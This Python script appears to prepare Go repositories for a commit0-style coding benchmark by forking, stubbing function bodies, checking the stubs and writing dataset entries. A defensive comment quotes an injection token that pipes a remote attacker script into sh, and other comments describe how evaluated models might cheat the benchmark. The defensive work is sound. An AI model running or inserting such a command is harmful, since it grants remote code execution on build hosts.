"""Prepare Go repos for a commit0 dataset.

For each validated Go candidate:
1. Fork to target GitHub org
2. Create a 'commit0_all' branch
3. Apply Go AST stubbing via gostubber binary
4. Commit stubbed version as base_commit
5. Reset to original as reference_commit
6. Generate setup/test dict entries
7. Output dataset entries (GoRepoInstance-compatible)

Usage:
    python -m tools.prepare_repo_go validated.json --output dataset_entries.json
    python -m tools.prepare_repo_go --repo sourcegraph/conc --clone-dir ./repos_staging --output dataset_entries.json
    python -m tools.prepare_repo_go validated.json --dry-run --output dataset_entries.json

Requires:
    - GITHUB_TOKEN env var with repo/fork permissions
    - gh CLI installed (for forking)
    - gostubber binary (built automatically from tools/gostubber/)
"""

from __future__ import annotations

import argparse
import json
import logging
import os
import shutil
import subprocess
import sys
from pathlib import Path
from kaiju.paths import datasets_dir
import uuid as _uuid_mod

logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
logger = logging.getLogger(__name__)

DEFAULT_ORG = "Zahgon"
TOOLS_DIR = Path(__file__).parent


def _find_goimports() -> str:
    """Find goimports binary, checking PATH and common Go install locations."""
    path = shutil.which("goimports")
    if path:
        return path
    for candidate in [
        Path.home() / "go" / "bin" / "goimports",
        Path(os.environ.get("GOPATH", "")) / "bin" / "goimports"
        if os.environ.get("GOPATH")
        else None,
        Path(os.environ.get("GOROOT", "")) / "bin" / "goimports"
        if os.environ.get("GOROOT")
        else None,
    ]:
        if candidate and candidate.is_file():
            return str(candidate)
    raise FileNotFoundError(
        "goimports not found. Install with: go install golang.org/x/tools/cmd/goimports@latest "
        "and ensure ~/go/bin is on PATH, or set GOPATH."
    )


sys.path.insert(0, str(TOOLS_DIR.parent))
from tools.stub_go import _ensure_gostubber

from tools._git_auth import (
    git,
    fork_repo,
    push_to_fork,
    setup_git_credentials,
)

_scrape_spec_sync = None


def _get_scrape_func():
    """Lazy-load scrape_spec_sync to avoid importing optional deps at module level."""
    global _scrape_spec_sync
    if _scrape_spec_sync is None:
        from tools.scrape_pdf import scrape_spec_sync

        _scrape_spec_sync = scrape_spec_sync
    return _scrape_spec_sync




def get_head_sha(repo_dir: Path) -> str:
    return git(repo_dir, "rev-parse", "HEAD")


def get_default_branch(repo_dir: Path) -> str:
    try:
        ref = git(repo_dir, "symbolic-ref", "refs/remotes/origin/HEAD")
        return ref.split("/")[-1]
    except subprocess.CalledProcessError:
        for branch in ["main", "master"]:
            try:
                git(repo_dir, "rev-parse", f"refs/remotes/origin/{branch}")
                return branch
            except subprocess.CalledProcessError:
                continue
        return "main"




def full_clone(
    full_name: str, clone_dir: Path, branch: str | None = None, tag: str | None = None
) -> Path:
    repo_dir = clone_dir / full_name.replace("/", "__")
    if repo_dir.exists():
        shallow_file = repo_dir / ".git" / "shallow"
        if shallow_file.exists():
            logger.info("  Unshallowing existing clone...")
            git(repo_dir, "fetch", "--unshallow", check=False, timeout=300)
        if tag:
            git(repo_dir, "fetch", "--tags", timeout=120)
            # check=True: a tag that can't be resolved (deleted/renamed) must
            # FAIL, not silently leave HEAD on the default-branch tip — otherwise
            # reference_commit/base_commit are pinned to the WRONG commit.
            git(repo_dir, "checkout", tag, check=True)
        else:
            # Reused non-tag clone: reset to pristine default so create_stubbed_branch
            # records the ORIGINAL code as reference_commit (a prior prep may have left
            # HEAD on the stub branch). create_stubbed_branch no longer checks out
            # default itself (that discarded pinned tags), so the reset lives here.
            try:
                _def = get_default_branch(repo_dir)
                git(repo_dir, "fetch", "origin", _def, "--prune", check=False, timeout=120)
                git(repo_dir, "checkout", "-f", _def, check=False)
                git(repo_dir, "reset", "--hard", f"origin/{_def}", check=False)
            except Exception as _e:  # noqa: BLE001 - best-effort; fresh clones unaffected
                logger.warning("  Could not reset reused clone to pristine default: %s", _e)
        return repo_dir

    url = f"https://github.com/{full_name}.git"
    ref = tag or branch
    cmd = ["git", "clone", url, str(repo_dir)]
    if ref:
        cmd = ["git", "clone", "--branch", ref, url, str(repo_dir)]

    try:
        subprocess.run(cmd, capture_output=True, text=True, timeout=600, check=True)
    except subprocess.CalledProcessError:
        if ref and repo_dir.exists():
            shutil.rmtree(repo_dir)
        cmd = ["git", "clone", url, str(repo_dir)]
        subprocess.run(cmd, capture_output=True, text=True, timeout=600, check=True)
        if tag:
            # check=True: a tag that can't be resolved (deleted/renamed) must
            # FAIL, not silently leave HEAD on the default-branch tip — otherwise
            # reference_commit/base_commit are pinned to the WRONG commit.
            git(repo_dir, "checkout", tag, check=True)

    return repo_dir


def detect_go_module(repo_dir: Path) -> dict:
    """Detect Go module info from go.mod."""
    go_mod = repo_dir / "go.mod"
    if not go_mod.exists():
        return {}

    info: dict = {}
    content = go_mod.read_text()
    for line in content.splitlines():
        line = line.strip()
        if line.startswith("module "):
            info["module_path"] = line.split(None, 1)[1]
        elif line.startswith("go "):
            info["go_version"] = line.split(None, 1)[1]
    return info


def create_stubbed_branch(
    repo_dir: Path,
    full_name: str,
    branch_name: str | None = None,
) -> tuple[str, str]:
    """Create the commit0 branch with Go-stubbed code.

    Returns (base_commit_sha, reference_commit_sha).

    Workflow:
    1. Record the current HEAD as reference_commit
    2. Create branch 'commit0_all'
    3. Run gostubber on .go source files
    4. Commit stubbed version as base_commit
    """
    if branch_name is None:
        branch_name = "commit0_all"

    gostubber_bin = _ensure_gostubber()

    # Record reference + create the stub branch from the CURRENT HEAD — which is
    # the pinned release tag when full_clone checked one out (--tag). Previously
    # this checked out the default branch first, silently discarding the tag, so
    # base_commit was built on the default-branch tip while reference_commit
    # pointed at the tag (divergent history) — the evaluated base was NOT the
    # released version. Branch from HEAD so base = stubbed(reference).
    reference_commit = get_head_sha(repo_dir)
    logger.info("  Reference commit (original): %s", reference_commit[:12])

    try:
        git(repo_dir, "branch", "-D", branch_name, check=False)
    except Exception:
        pass
    git(repo_dir, "checkout", "-b", branch_name)

    logger.info("  Running gostubber on %s...", repo_dir.name)

    # N25/N26: warn on Go features the stub/eval pipeline doesn't model.
    #   Build tags (`//go:build tag` / legacy `// +build tag`): a model could
    #     hide a cheat behind a rare build tag; the stubber processes files as
    #     the compiler sees the DEFAULT tag set, so an alternate-tag file is
    #     invisible to stubbing (and to canonical inventory).
    #   cgo (`import "C"`): the stubber only touches .go, so a .c/.h/.cc file
    #     alongside a cgo import block can carry the real impl unstubbed.
    _build_tagged: list[str] = []
    _cgo_files: list[str] = []
    for _pre in repo_dir.rglob("*.go"):
        try:
            _rel = _pre.relative_to(repo_dir)
            if any(p in {"vendor", ".git", "testdata", "internal"} for p in _rel.parts):
                continue
            head = _pre.read_text(errors="replace").splitlines()[:30]
            for ln in head:
                s = ln.strip()
                if s.startswith("//go:build") or s.startswith("// +build"):
                    _build_tagged.append(str(_rel))
                    break
                if s.startswith("import \"C\"") or s == 'import "C"':
                    _cgo_files.append(str(_rel))
                    break
        except OSError:
            continue
    if _build_tagged:
        logger.warning(
            "  Build-tag-gated files present (%d) — stubbing sees only the default tag set, "
            "any alternate-tag impl is invisible to the harness: %s%s",
            len(_build_tagged), _build_tagged[:5],
            " ..." if len(_build_tagged) > 5 else "",
        )
    if _cgo_files:
        logger.warning(
            "  cgo files present (%d) — .c/.h/.cc alongside these carry impl the "
            "stubber cannot touch; do not onboard cgo repos without a review: %s%s",
            len(_cgo_files), _cgo_files[:5],
            " ..." if len(_cgo_files) > 5 else "",
        )
    stubbed_count = 0
    stub_failures: list[str] = []
    for go_file in repo_dir.rglob("*.go"):
        rel = go_file.relative_to(repo_dir)
        # N2: `internal` skipped for parity with tools/stub_go.SKIP_DIRS and
        # tools/discover_go.SKIP_DIRS. Go's internal/ is a language-enforced
        # import boundary; keeping it out of the scored surface makes the eval
        # scope match the inventory scope (both exclude internal helpers).
        if any(p in {"vendor", ".git", "testdata", "internal"} for p in rel.parts):
            continue
        if go_file.name.endswith("_test.go") or go_file.name == "doc.go":
            continue
        # A file gostubber cannot process (parse error, timeout, unsupported
        # construct) is NOT harmless: skipping it leaves its FULL reference
        # implementation in the "stubbed" base, leaking the answer to the agent.
        # Track every failure and fail loud below rather than silently ship it.
        try:
            result = subprocess.run(
                [str(gostubber_bin), str(go_file)],
                capture_output=True,
                text=True,
                timeout=30,
            )
        except subprocess.TimeoutExpired:
            stub_failures.append(f"{rel} (timeout >30s)")
            logger.error("  gostubber TIMEOUT on %s (>30s) — impl left unstubbed", rel)
            continue
        if result.returncode == 0:
            stubbed_count += 1
        else:
            stub_failures.append(str(rel))
            logger.error(
                "  gostubber FAILED on %s (rc=%d): %s",
                rel, result.returncode, (result.stderr or "").strip()[:300],
            )
    logger.info("  Stubbed %d Go files", stubbed_count)
    if stub_failures:
        raise RuntimeError(
            f"gostubber failed on {len(stub_failures)} file(s) in {full_name}: "
            f"{stub_failures[:10]}"
            f"{' ...' if len(stub_failures) > 10 else ''} — refusing to ship a task "
            f"that would leak these implementations. Fix the stubber or exclude the repo."
        )

    logger.info("  Running goimports to clean unused imports...")
    goimports_bin = _find_goimports()
    subprocess.run(
        [goimports_bin, "-w", "."],
        cwd=repo_dir,
        capture_output=True,
        text=True,
        timeout=120,
    )

    for test_file in repo_dir.rglob("*_test.go"):
        subprocess.run(
            ["git", "checkout", "--", str(test_file.relative_to(repo_dir))],
            cwd=repo_dir,
            capture_output=True,
            text=True,
        )

    git(repo_dir, "add", "-A")

    status = git(repo_dir, "status", "--porcelain")
    if not status:
        logger.warning("  No changes after stubbing — source may already be stubs?")
        base_commit = reference_commit
    else:
        diff_patch = git(repo_dir, "diff", "--cached")
        additions = sum(
            1
            for line in diff_patch.splitlines()
            if line.startswith("+") and not line.startswith("+++")
        )
        deletions = sum(
            1
            for line in diff_patch.splitlines()
            if line.startswith("-") and not line.startswith("---")
        )
        logger.info(
            "  Diff stats — lines added: %d, lines removed: %d", additions, deletions
        )
        # Gate on EVIDENCE that function bodies were actually replaced (stub
        # markers present in the diff), NOT on raw line deltas. gostubber strips
        # doc comments even when it stubs zero bodies, so a comment-only diff
        # (additions/deletions > 0) could otherwise pass a base that is
        # functionally identical to reference — a trivial auto-pass task. The
        # marker is the gostubber sentinel `"STUB: not implemented"`.
        stub_markers = diff_patch.count("STUB: not implemented")
        if stub_markers == 0:
            raise RuntimeError(
                f"Stubbing verification failed for {full_name}: no stub markers in "
                f"the diff (additions={additions}, deletions={deletions}) — no function "
                f"body was replaced, so the base is functionally identical to reference."
            )
        logger.info("  Stub markers placed: %d", stub_markers)

        git(repo_dir, "commit", "-m", "Commit 0")
        base_commit = get_head_sha(repo_dir)

    logger.info("  Base commit (stubbed): %s", base_commit[:12])
    return base_commit, reference_commit




def resolve_commits_from_remote(fork_name: str, branch: str) -> tuple[str, str] | None:
    """Resolve base/reference commits from remote branch via GitHub API."""
    try:
        result = subprocess.run(
            ["gh", "api", f"repos/{fork_name}/branches/{branch}"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode != 0:
            return None
        branch_data = json.loads(result.stdout)
        sha = branch_data["commit"]["sha"]

        result = subprocess.run(
            ["gh", "api", f"repos/{fork_name}/commits/{sha}"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode != 0:
            return None
        commit_data = json.loads(result.stdout)
        parent_sha = commit_data["parents"][0]["sha"]

        return (sha, parent_sha)
    except Exception as e:
        logger.debug("Non-critical failure during remote commit resolution: %s", e)
        return None


def build_setup_dict(repo_dir: Path, go_info: dict, full_name: str) -> dict:
    """Build the setup dict for a Go repo (mirrors Python's pip/packages setup)."""
    pre_install: list[str] = []

    apt_deps_file = repo_dir / ".apt-packages"
    if apt_deps_file.exists():
        # N3 (shell-injection close): `.apt-packages` values are dropped straight
        # into the setup script that later runs `apt-get install $pkg` in the
        # container-build path. A repo (or poisoned dataset row) with a token
        # like `foo; curl attacker.sh | sh` previously got command execution.
        # Enforce a strict apt-package-name shape: leading alnum, then alnum /
        # . / + / - / _ / : (per Debian policy §5.6.7). Reject anything else.
        import re as _re
        _APT_PKG_RE = _re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9+._\-]*(?::[a-zA-Z0-9+._\-]+)?$")
        pre_install = []
        for line in apt_deps_file.read_text().splitlines():
            tok = line.strip()
            if not tok or tok.startswith("#"):
                continue
            if not _APT_PKG_RE.match(tok):
                raise ValueError(
                    f"Refusing to build setup script: unsafe .apt-packages token "
                    f"{tok!r} in {apt_deps_file} — must be a valid Debian package name."
                )
            pre_install.append(tok)

    spec_url = _find_docs_url(go_info.get("module_path", ""))

    # Canonical Go version detection (toolchain > go.mod > GHA matrix > Dockerfile)
    from tools.go_version import detect as _detect_go

    det = _detect_go(repo_dir, fallback=go_info.get("go_version") or "1.22")
    go_version = det.version or "1.22"

    return {
        "install": "go mod download && go build ./...",
        "packages": "",
        "pip_packages": "",
        "pre_install": pre_install,
        "go_version": go_version,
        "specification": spec_url,
        "version_source": det.source,
        "version_conflicts": det.conflicts,
    }


def _find_docs_url(module_path: str) -> str:
    """Construct the official pkg.go.dev documentation URL using the Go module path.

    Uses the module path from go.mod (e.g. 'github.com/go-chi/chi/v5',
    'go.uber.org/zap') to form the canonical pkg.go.dev URL. This correctly
    handles vanity import paths and v2+ major-version suffixes. If scraping
    it 404s, the caller falls back to generating a spec from the README.
    """
    return f"https://pkg.go.dev/{module_path}"




def build_test_dict(repo_dir: Path) -> dict:
    """Build the test dict for a Go repo."""
    return {
        "test_cmd": "go test -json -count=1 ./...",
        "test_dir": ".",
    }


def _stubbed_base_compiles_go(repo_dir: Path, timeout: int = 900) -> "bool | None":
    """A11 (go): does the STUBBED base tree compile?

    A correctly-stubbed repo replaces function bodies with `_ = "STUB…"; return
    <zero>`, which still typechecks — so the base should build. If it doesn't, the
    agent starts from a broken tree and any 0% is an infra/impossible-task
    artifact, not a model failure.

    Returns True (compiles), False (does not), or None (couldn't determine — go
    missing, timeout, or a network/fetch error) so the caller records provenance
    without branding a good repo as broken over a transient prep-time blip.
    Mirrors ruststubber's _stubbed_base_compiles. `go build ./...` also auto-fetches
    deps, warming the module cache for the test-id capture that follows.
    """
    if shutil.which("go") is None:
        # F2c: fail-fast — prep host is expected to have go (bootstrap_ec2.sh
        # installs it). Silently skipping shipped un-verified stubs to the dataset.
        # Escape hatch preserves old behavior for dev machines that lack the toolchain.
        import os as _os
        if _os.environ.get("KAIJU_PREPARE_ALLOW_MISSING_TOOLCHAIN") == "1":
            logger.warning("A11: go not on PATH; SKIPPING stubbed-base compile check "
                           "(KAIJU_PREPARE_ALLOW_MISSING_TOOLCHAIN=1). The dataset may "
                           "contain uncompilable stubs — do NOT ship to production.")
            return None
        raise RuntimeError(
            "prepare_repo_go: go not on PATH. Prep host must have the Go toolchain "
            "installed to verify stubbed base compiles. Install via scripts/bootstrap_ec2.sh, "
            "or set KAIJU_PREPARE_ALLOW_MISSING_TOOLCHAIN=1 to skip (dataset quality will degrade)."
        )
    try:
        proc = subprocess.run(
            ["go", "build", "./..."],
            cwd=str(repo_dir),
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except (subprocess.TimeoutExpired, OSError) as e:
        logger.warning("A11: stubbed-base compile check could not run (%s); recording unknown.", e)
        return None
    if proc.returncode == 0:
        return True
    # A non-zero exit isn't necessarily "base doesn't compile": a cold module cache
    # / registry outage at prep time also fails. Treat those as unknown (None) so a
    # transient network blip doesn't permanently brand a solvable repo.
    combined = ((proc.stderr or "") + (proc.stdout or "")).lower()
    net_markers = (
        "dial tcp", "no such host", "connection refused", "i/o timeout",
        "network is unreachable", "timeout awaiting", "could not resolve",
        "unrecognized import path", "reading ", "410 gone", "connection reset",
        "tls handshake timeout", "proxyconnect", "server misbehaving",
    )
    if any(m in combined for m in net_markers):
        logger.warning(
            "A11: stubbed-base compile check hit a fetch/network error (not a real "
            "compile failure); recording unknown for %s.", repo_dir,
        )
        return None
    return False


def _capture_go_test_ids(repo_dir: Path, test_cmd: str, repo_basename: str) -> None:
    """Capture the canonical Go test inventory via `go test -list ./...` on the
    stubbed base and save it to ``commit0/data/test_ids/<repo>.bz2`` — the
    AUTHORITATIVE denominator ``evaluate_go`` scores against. Without it the
    evaluator falls back to the observed test count (mis-reporting a
    timeout-truncated run and letting a model inflate its score by adding
    passing tests).

    Keyed by the repo basename; ``save_test_ids`` normalises the name to
    ``repo.lower().replace(".", "-")`` — exactly what ``get_go_test_ids`` looks
    up for the single-file (no ``__``) case. ``test_cmd`` is accepted for parity
    with the Rust helper but not forwarded: ``collect_test_ids_local`` always
    runs its own ``go test -list . -json -count=1 ./...`` sweep.

    Best-effort: any failure logs a warning and does NOT abort prep.
    """
    try:
        from tools.generate_test_ids_go import (
            collect_test_ids_local,
            save_test_ids,
        )
    except Exception as e:  # noqa: BLE001
        logger.warning("  Test-ID capture: could not import helpers (%s); skipping.", e)
        return
    out_dir = Path(__file__).resolve().parent.parent / "commit0" / "data" / "test_ids"

    def _warn_if_stale_remains(reason: str) -> None:
        # Staleness guard (Rust parity): on a FAILED/empty capture during a
        # RE-prep, an inventory from a PRIOR prep may still sit on disk under the
        # normalized key. If the repo's tests changed, that .bz2 is now a stale
        # denominator the evaluator silently trusts. We do NOT delete it (that
        # would drop the denominator to the observed count), but surface it loudly
        # so the operator can purge it before scoring a large batch.
        try:
            from kaiju.paths import normalize_test_ids_key
            prior = out_dir / f"{normalize_test_ids_key(repo_basename)}.bz2"
            if prior.exists():
                logger.error(
                    "  Test-ID capture: %s for %s, but a PRIOR inventory still "
                    "exists at %s. If the repo's tests changed since it was "
                    "written it is now a STALE denominator — delete it before "
                    "scoring if unsure.", reason, repo_basename, prior,
                )
        except Exception:  # noqa: BLE001
            pass

    try:
        ids = collect_test_ids_local(repo_dir)
    except Exception as e:  # noqa: BLE001
        logger.warning(
            "  Test-ID capture: `go test -list` failed for %s (%s); the "
            "evaluator will use the observed test count.", repo_basename, e,
        )
        _warn_if_stale_remains("FAILED")
        return
    if not ids:
        logger.warning(
            "  Test-ID capture: no test IDs discovered for %s; the evaluator "
            "will use the observed test count.", repo_basename,
        )
        _warn_if_stale_remains("found no tests")
        return
    try:
        path = save_test_ids(ids, repo_basename, out_dir)
        logger.info("  Test-ID capture: saved %d canonical test IDs -> %s", len(ids), path)
    except Exception as e:  # noqa: BLE001
        logger.warning("  Test-ID capture: failed to save test IDs for %s (%s).", repo_basename, e)


def prepare_single_repo(
    full_name: str,
    clone_dir: Path,
    org: str = DEFAULT_ORG,
    dry_run: bool = False,
    tag: str | None = None,
    specs_dir: str = "./specs",
) -> dict | None:
    logger.info("\n=== Preparing %s ===", full_name)

    try:
        if dry_run:
            forked_name = f"{org}/{full_name.split('/')[-1]}"
            logger.info("  [DRY RUN] Would fork to %s", forked_name)
        else:
            forked_name = fork_repo(full_name, org)

        repo_dir = full_clone(full_name, clone_dir, tag=tag)
        go_info = detect_go_module(repo_dir)

        if not go_info.get("module_path"):
            # B4: GOPATH-era Go repos (pre-Go 1.11, no go.mod) are unsupported.
            # Previously logged 'warning' and silently returned None, so entire
            # batches could quietly drop repos without any error signal. Now:
            # log at ERROR level so the batch driver surfaces it explicitly.
            logger.error(
                "  UNSUPPORTED_LAYOUT: %s has no go.mod (GOPATH-era repo)."
                " commit0 requires Go modules. Skipping.",
                full_name,
            )
            return None

        base_commit, reference_commit = create_stubbed_branch(repo_dir, full_name)

        # A11 (go): verify the STUBBED base compiles. Stubs return zero values so
        # they typecheck — a base that does NOT compile means the agent starts from
        # a broken tree (bad stub, a stripped build tag, a missing symbol), so any
        # resulting 0% is an infra/impossible-task artifact, not a model failure.
        # `go build ./...` also warms the module cache for the capture below.
        base_compiles = _stubbed_base_compiles_go(repo_dir)
        if base_compiles is False:
            logger.warning(
                "A11: STUBBED BASE DOES NOT COMPILE for %s — the agent would start "
                "from a broken tree; recording base_compiles=false (any 0%% here is "
                "infra, not model). Investigate the stub output before trusting a score.",
                full_name,
            )
        elif base_compiles is True:
            logger.info("A11: stubbed base compiles cleanly for %s.", full_name)

        # Capture the canonical test inventory (`go test -list ./...`) on the
        # stubbed base (repo is on commit0_all here) and save it as
        # commit0/data/test_ids/<repo>.bz2 — the AUTHORITATIVE denominator
        # evaluate_go scores against. Key by the FORK basename, because that is
        # exactly what the eval looks up (`evaluate_go` derives repo_name from the
        # dataset entry's `repo` field == forked_name). Keying by the original
        # basename silently mismatched whenever GitHub suffixed the fork on an
        # org-name collision (`name` -> `name-1`), leaving eval to fall back to
        # the observed count (Issue 1). Best-effort: never aborts prep.
        _capture_go_test_ids(
            repo_dir, build_test_dict(repo_dir)["test_cmd"], forked_name.split("/")[-1]
        )

        if not dry_run:
            branch_name = "commit0_all"
            try:
                git(repo_dir, "checkout", branch_name)
                push_to_fork(repo_dir, forked_name, branch=branch_name)
            except Exception as e:
                logger.error("  Push failed: %s", e)
                remote_commits = resolve_commits_from_remote(forked_name, branch_name)
                if remote_commits:
                    base_commit, reference_commit = remote_commits
                    logger.info(
                        "  Resolved commits from remote: base=%s, ref=%s",
                        base_commit[:12],
                        reference_commit[:12],
                    )
                else:
                    raise RuntimeError(
                        f"Push to {forked_name} FAILED and no usable '{branch_name}' "
                        f"branch exists on the fork. The container build clones this "
                        f"fork and fetches base/reference commits from it, so a "
                        f"dataset built from un-pushed local commits is UNBUILDABLE "
                        f"('not our ref'). Ensure your token has WRITE access to the "
                        f"fork org (run_trajectory.sh: --org / $KAIJU_FORK_ORG).\n"
                        f"Original push error: {e}"
                    ) from e

        setup_dict = build_setup_dict(repo_dir, go_info, full_name)
        test_dict = build_test_dict(repo_dir)

        spec_path = None
        if setup_dict.get("specification"):
            repo_name = full_name.split("/")[-1]
            docs_url = setup_dict["specification"]
            logger.info("  Scraping spec from: %s", docs_url)
            try:
                scrape_fn = _get_scrape_func()
                spec_path = scrape_fn(
                    base_url=docs_url,
                    name=repo_name,
                    output_dir=str(specs_dir),
                    compress=True,
                )
                if spec_path:
                    logger.info("  Spec saved: %s", spec_path)
                    branch_name = "commit0_all"
                    git(repo_dir, "checkout", branch_name)
                    dest = repo_dir / "spec.pdf.bz2"
                    shutil.copy2(spec_path, dest)
                    git(repo_dir, "add", "spec.pdf.bz2")
                    git(repo_dir, "commit", "-m", f"Add spec PDF for {repo_name}")
                    base_commit = get_head_sha(repo_dir)
                    logger.info("  Updated base_commit with spec: %s", base_commit[:12])

                    if not dry_run:
                        try:
                            push_to_fork(
                                repo_dir, forked_name, branch=branch_name
                            )
                        except Exception as e:
                            logger.warning("  Spec push failed: %s", e)
                else:
                    logger.warning("  Spec scraping returned no output")
            except ImportError:
                logger.warning(
                    "  Skipping spec scrape — install: pip install playwright PyMuPDF PyPDF2 beautifulsoup4 requests && playwright install chromium"
                )
            except Exception as e:
                logger.warning("  Spec scraping failed: %s", e)

        # Fallback: generate a README-based spec if URL scraping produced nothing
        if spec_path is None:
            _rname = full_name.split("/")[-1]
            try:
                from tools.scrape_pdf import scrape_readme_spec as _scrape_readme_spec
                readme_spec_path, readme_spec_url = _scrape_readme_spec(repo_dir, specs_dir, _rname)
            except ImportError:
                readme_spec_path, readme_spec_url = None, ""
            if readme_spec_path:
                if readme_spec_url:
                    setup_dict["specification"] = readme_spec_url
                try:
                    branch_name = "commit0_all"
                    git(repo_dir, "checkout", branch_name)
                    dest = repo_dir / "spec.pdf.bz2"
                    shutil.copy2(str(readme_spec_path), dest)
                    git(repo_dir, "add", "spec.pdf.bz2")
                    git(repo_dir, "commit", "-m", f"Add README-based spec for {_rname}")
                    base_commit = get_head_sha(repo_dir)
                    logger.info(
                        "  Updated base_commit with README spec: %s", base_commit[:12]
                    )
                    if not dry_run:
                        try:
                            push_to_fork(
                                repo_dir, forked_name, branch=branch_name
                            )
                        except Exception as push_err:
                            logger.warning("  README spec push failed: %s", push_err)
                    spec_path = str(readme_spec_path)
                except Exception as commit_err:
                    logger.warning("  README spec commit failed: %s", commit_err)

        _final_spec_source = "docs" if spec_path else "none"
        from tools.scrape_pdf import enforce_strict_spec_mode as _enforce_strict_spec
        _enforce_strict_spec(_final_spec_source, full_name.split("/")[-1])

        repo_name = full_name.split("/")[-1]
        entry = {
            "instance_id": f"commit-0/{repo_name}",
            "id": str(_uuid_mod.uuid4()),
            "repo": forked_name,
            "original_repo": full_name,
            "base_commit": base_commit,
            "reference_commit": reference_commit,
            "setup": setup_dict,
            "test": test_dict,
            "src_dir": ".",
            "language": "go",
            # A11 provenance: True = stubbed base compiles, False = does NOT
            # (a 0% is infra, not model), None = not checked (go missing/timeout/net).
            "base_compiles": base_compiles,
        }

        if dry_run:
            entry["base_commit"] = "DRY_RUN"
            entry["reference_commit"] = "DRY_RUN"

        logger.info("  Entry created for %s", full_name)
        return entry

    except Exception as e:
        logger.error("  FAILED to prepare %s: %s", full_name, e)
        return None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Prepare Go repos for a commit0 dataset"
    )
    parser.add_argument(
        "input_file",
        nargs="?",
        help="Input validated.json from validate_go.py",
    )
    parser.add_argument("--repo", type=str, help="Single repo to prepare (owner/name)")
    parser.add_argument(
        "--clone-dir",
        type=Path,
        default=Path("./repos_staging"),
        help="Directory for cloning repos (default: ./repos_staging)",
    )
    parser.add_argument(
        "--output",
        type=str,
        default="dataset_entries_go.json",
        help="Output JSON file (default: dataset_entries.json)",
    )
    parser.add_argument(
        "--org",
        type=str,
        default=DEFAULT_ORG,
        help=f"GitHub org to fork into (default: {DEFAULT_ORG})",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Skip GitHub fork and push operations",
    )
    parser.add_argument(
        "--max-repos",
        type=int,
        default=None,
        help="Maximum number of repos to prepare",
    )
    parser.add_argument(
        "--tag",
        type=str,
        default=None,
        help="Git tag to checkout before stubbing",
    )
    parser.add_argument(
        "--specs-dir",
        type=str,
        default="./specs",
        help="Directory to save scraped spec PDFs (default: ./specs)",
    )

    parser.add_argument(
        "--outputs-root",
        type=str,
        default=None,
        help="Root for consolidated outputs (overrides $KAIJU_OUTPUTS_ROOT; default: ./outputs)",
    )
    parser.add_argument(
        "--layout",
        choices=["flat", "consolidated"],
        default=None,
        help="Output layout: 'flat' (legacy) or 'consolidated' (outputs/<uuid>/…). Overrides $KAIJU_LOG_LAYOUT.",
    )

    args = parser.parse_args()

    if args.outputs_root is not None:
        os.environ["KAIJU_OUTPUTS_ROOT"] = args.outputs_root
    if args.layout is not None:
        os.environ["KAIJU_LOG_LAYOUT"] = args.layout
    _consolidated = os.environ.get("KAIJU_LOG_LAYOUT", "consolidated").lower() == "consolidated"

    setup_git_credentials(dry_run=args.dry_run)

    # Host-side prep runs `go build`/`go test -list` on the HOST toolchain, which
    # can differ from the eval container's Go (constants_go.GO_VERSION). Force
    # GOTOOLCHAIN=auto so Go self-selects the toolchain each repo's go.mod
    # requires — same selection the container makes — instead of silently failing
    # the base-compile / inventory capture on a host that is too old (which then
    # feeds the empty-inventory 0/N path). setdefault: respect an explicit
    # operator override.
    os.environ.setdefault("GOTOOLCHAIN", "auto")

    args.clone_dir.mkdir(parents=True, exist_ok=True)

    entries: list[dict] = []

    if args.repo:
        result = prepare_single_repo(
            args.repo,
            args.clone_dir,
            org=args.org,
            dry_run=args.dry_run,
            tag=args.tag,
            specs_dir=args.specs_dir,
        )
        if result:
            entries.append(result)
    elif args.input_file:
        candidates = json.loads(Path(args.input_file).read_text())
        if isinstance(candidates, dict) and "data" in candidates:
            candidates = candidates["data"]

        for i, candidate in enumerate(candidates):
            if args.max_repos and i >= args.max_repos:
                break

            full_name = candidate.get("full_name") or candidate.get("repo", "")
            if not full_name:
                logger.warning("  Skipping entry %d: no full_name or repo", i)
                continue

            result = prepare_single_repo(
                full_name,
                args.clone_dir,
                org=args.org,
                dry_run=args.dry_run,
                tag=candidate.get("tag"),
                specs_dir=args.specs_dir,
            )
            if result:
                entries.append(result)
    else:
        parser.error("Provide either input_file or --repo")

    if _consolidated and entries and entries[0].get("id"):
        _uuid = entries[0]["id"]
        _out_dir = datasets_dir(_uuid)
        _entries_path = _out_dir / "entries.json"
        _entries_path.write_text(json.dumps(entries, indent=2))
        logger.info("Wrote %d entries to %s (consolidated)", len(entries), _entries_path)
        # Stage each captured test-id inventory into outputs/<uuid>/datasets/ so the
        # CONTAINERIZED eval finds it via KAIJU_TEST_IDS_DIR (commit0/data/ is pruned
        # from the agent image). Mirrors prepare_repo_rust; without this a repo
        # prepared via prepare_repo_go (which never calls create_dataset_go) silently
        # loses the canonical denominator in the container.
        try:
            from kaiju.paths import copy_inference_inputs as _cii
            for _e in entries:
                _cii(_uuid, _e["repo"].split("/")[-1],
                     test_ids_subdir="test_ids", repo_base="repos")
        except Exception as _cie:  # noqa: BLE001 - best-effort staging
            logger.warning("copy_inference_inputs failed: %s", _cie)
        if args.output:
            output_path = Path(args.output)
            output_path.write_text(json.dumps(entries, indent=2))
            logger.info("Also wrote legacy copy to %s", output_path)
    else:
        output_path = Path(args.output)
        output_path.write_text(json.dumps(entries, indent=2))
        logger.info("\nSaved %d entries to %s", len(entries), output_path)

    # Generate the commit0-go build config (parity with prepare_repo_rust's
    # generate_commit0_yaml) so `cli_go build --commit0-config-file .commit0_go.yaml`
    # works without the operator hand-writing dataset_name/split/repo_split/base_dir.
    try:
        _ds_name = f"./{Path(args.output).name}"
        _cfg = (TOOLS_DIR.parent / ".commit0_go.yaml")
        _first = entries[0] if entries else {}
        _cfg.write_text(
            f"# commit0 Go config for {_first.get('original_repo', '?')}\n"
            f"dataset_name: {_ds_name}\n"
            "dataset_split: test\n"
            "repo_split: all\n"
            "base_dir: repos\n"
            f"# fork: {_first.get('repo', '?')}\n"
            f"# test_cmd: {(_first.get('test') or {}).get('test_cmd', '?')}\n"
        )
        logger.info("Generated config: %s", _cfg)
    except Exception as _cfg_err:  # noqa: BLE001 - best-effort
        logger.warning("commit0-go config generation failed: %s", _cfg_err)

